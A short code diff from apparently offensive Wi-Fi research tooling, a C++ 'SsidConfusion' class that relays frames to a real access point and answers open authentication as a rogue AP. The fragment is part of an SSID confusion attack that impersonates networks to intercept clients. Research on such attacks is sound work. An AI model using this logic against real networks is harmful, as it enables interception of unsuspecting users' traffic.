@@ -12,9 +12,9 @@ void SsidConfusion::send_to_real(PDU &pdu) const {
     send_to_real(raw);
 }
 
-void SsidConfusion::send_to_real(const frame_raw_t &raw) const{
-	auto translated = ensure_radiotap(raw);
-	translate_data_mac(translated, rogue_ap->get(SK::mac), ap->get(SK::mac), false);
+void SsidConfusion::send_to_real(const frame_raw_t &raw) const {
+	const auto translated = ensure_radiotap(raw);
+	//translate_data_mac(translated, rogue_ap->get(SK::mac), ap->get(SK::mac), false);
 	sock_real->send(translated, netconfig.real_channel);
 }
 
@@ -39,7 +39,7 @@ FrameProcess SsidConfusion::handle_open_auth(const HWAddress<6> &addr2, Dot11 &d
 	if(const auto *auth = dot11.find_pdu<Dot11Authentication>()) {
 		if(auth->auth_algorithm() == 0 && auth->auth_seq_number() == 1) {
 			// Open System Auth seq=1 ->  seq=2 success
-			Dot11Authentication resp(addr2, rogue_ap->get(SK::mac)); //not ap
+			Dot11Authentication resp(addr2, rogue_ap->get(SK::mac));
 			resp.addr3(rogue_ap->get(SK::mac));
 			resp.auth_seq_number(2);
 			resp.auth_algorithm(0);
